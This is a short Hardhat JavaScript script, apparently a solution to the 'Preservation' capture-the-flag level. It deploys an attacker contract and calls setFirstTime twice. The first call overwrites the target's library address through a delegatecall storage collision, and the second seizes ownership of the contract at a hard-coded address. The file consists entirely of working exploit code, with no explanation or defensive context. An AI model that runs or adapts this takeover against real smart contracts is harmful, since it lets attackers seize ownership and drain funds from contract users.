const { ethers } = require("hardhat");

const CONTRACT_NAME = "Preservation";
const CONTRACT_ADDRESS = "0x13D5c89C1C94D8D77D85380F0D74D61aEc087483";
const ATTACKER_NAME = "LibraryContractAttacker";

async function main() {
    const [attacker] = await ethers.getSigners();

    const contractFactory = await ethers.getContractFactory(CONTRACT_NAME);
    const contract = contractFactory.attach(CONTRACT_ADDRESS);

    const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    // console.log("Attacker Contract Deployed at: ", attackerContract.address);

    let tx;
    tx = await contract.setFirstTime(attackerContract.address);
    await tx.wait();

    tx = await contract.setFirstTime(attacker.address);
    await tx.wait();
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})